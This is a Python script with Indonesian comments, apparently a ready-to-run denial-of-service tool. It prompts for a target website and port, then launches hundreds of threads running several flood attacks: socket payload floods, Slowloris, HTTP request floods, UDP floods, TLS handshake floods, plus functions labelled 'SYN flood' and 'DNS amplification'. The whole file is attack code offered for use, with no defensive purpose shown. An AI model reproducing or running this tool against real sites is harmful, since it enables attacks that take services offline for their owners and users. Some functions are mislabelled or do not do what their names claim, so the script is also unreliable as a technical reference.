import socket
import threading
import random
import time
import requests
from urllib.parse import urlparse

# Fungsi untuk mengonversi URL menjadi IP
def get_ip_from_url(url):
    """Mengonversi URL menjadi IP"""
    try:
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        ip = socket.gethostbyname(domain)
        return ip
    except socket.gaierror:
        print("Error: Tidak dapat menemukan IP untuk URL tersebut.")
        return None

# Fungsi untuk melakukan Flooding menggunakan Sockets dengan payload besar
def flood_with_sockets(ip, port, num_requests, size_per_request):
    """Flooding dengan menggunakan soket dan payload besar"""
    for _ in range(num_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(b'A' * size_per_request)
            sock.close()
            time.sleep(random.uniform(0.01, 0.1))  # Jeda acak
        except Exception as e:
            print(f"Error: {e}")

# Fungsi untuk melakukan SYN Flooding
def syn_flood(ip, port):
    """Melakukan SYN Flooding"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    sock.connect((ip, port))
    sock.send(b'\x00' * 1024)
    sock.close()

# Fungsi untuk melakukan serangan Slowloris
def slowloris(ip, port):
    """Serangan Slowloris"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(b'GET / HTTP/1.1\r\n')
    sock.send(b'Host: ' + ip.encode() + b'\r\n')
    sock.send(b'Connection: Keep-Alive\r\n')
    while True:
        sock.send(b'X-a: ' + b'A' * 1000)
        time.sleep(1)

# Fungsi untuk mengirim request HTTP Flood
def send_http_requests(target_url, num_requests):
    """Flooding dengan permintaan HTTP yang besar"""
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.64"
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    for _ in range(num_requests):
        try:                                                                                                                                                                                  response = requests.get(target_url, headers=headers)
            print(f"Request ke {target_url} berhasil, Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error: {e}")

# Fungsi untuk mengirim UDP Flood
def udp_flood(ip, port, num_requests):
    """Serangan UDP Flood"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # Payload acak
    for _ in range(num_requests):
        sock.sendto(bytes_to_send, (ip, port))
        time.sleep(random.uniform(0.01, 0.1))

# Fungsi untuk melakukan DNS Amplification
def dns_amplification(target_ip):
    """Melakukan DNS Amplification"""
    dns_server = "8.8.8.8"  # Server DNS Google (ubah jika perlu)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    query = b'\x00\x00'  # Query DNS dummy
    sock.sendto(query, (dns_server, 53))  # Kirim query ke DNS server
    print(f"DNS Amplification ke {target_ip}")

# Fungsi untuk melakukan SSL/TLS Handshake Flood
def ssl_tls_handshake_flood(ip, port, num_requests):
    """SSL/TLS Handshake Flood"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    for _ in range(num_requests):
        try:
            sock.connect((ip, port))
            sock.send(b'\x16\x03\x01\x00\xdc\x01\x00\x00\xd8\x03\x03' +
                      b'\x58\x59\x4e\x68\x10\x59\x3d\x43\xa0\xb6\x3b\x59' +
                      b'\x46')
            time.sleep(0.5)
            sock.close()
        except Exception as e:
            print(f"Error: {e}")

# Fungsi untuk menjalankan semua serangan secara bersamaan
def start_attack(target_url, port, num_requests, size_per_request):
    """Mulai serangan dengan berbagai metode menggunakan thread"""
    ip = get_ip_from_url(target_url)
    if not ip:
        return

    threads = []

    # Thread untuk flooding dengan soket
    for _ in range(300):
        t = threading.Thread(target=flood_with_sockets, args=(ip, port, num_requests, size_per_request))
        threads.append(t)
        t.start()

    # Thread untuk SYN flooding
    for _ in range(300):
        t = threading.Thread(target=syn_flood, args=(ip, port))
        threads.append(t)
        t.start()

    # Thread untuk Slowloris
    for _ in range(300):
        t = threading.Thread(target=slowloris, args=(ip, port))
        threads.append(t)
        t.start()

    # Thread untuk HTTP request flooding
    for _ in range(300):
        t = threading.Thread(target=send_http_requests, args=(target_url, num_requests))
        threads.append(t)
        t.start()

    # Thread untuk 300 Flood
    for _ in range(300):
        t = threading.Thread(target=udp_flood, args=(ip, port, num_requests))
        threads.append(t)
        t.start()

    # Thread untuk DNS Amplification
    for _ in range(300):
        t = threading.Thread(target=dns_amplification, args=(ip,))
        threads.append(t)
        t.start()

    # Thread untuk SSL/TLS Handshake Flood
    for _ in range(300):
        t = threading.Thread(target=ssl_tls_handshake_flood, args=(ip, port, num_requests))
        threads.append(t)
        t.start()

    # Menunggu semua thread selesai
    for t in threads:
        t.join()

if __name__ == "__main__":
    # Input dari pengguna
    target_url = input("masukan url website :")
    port = int(input("Masukkan port :"))
    num_requests = int(input("Masukkan jumlah request per bot: "))
    size_per_request = int(input("Masukkan ukuran payload :"))

    # Memulai serangan
    start_attack(target_url, port, num_requests, size_per_request)
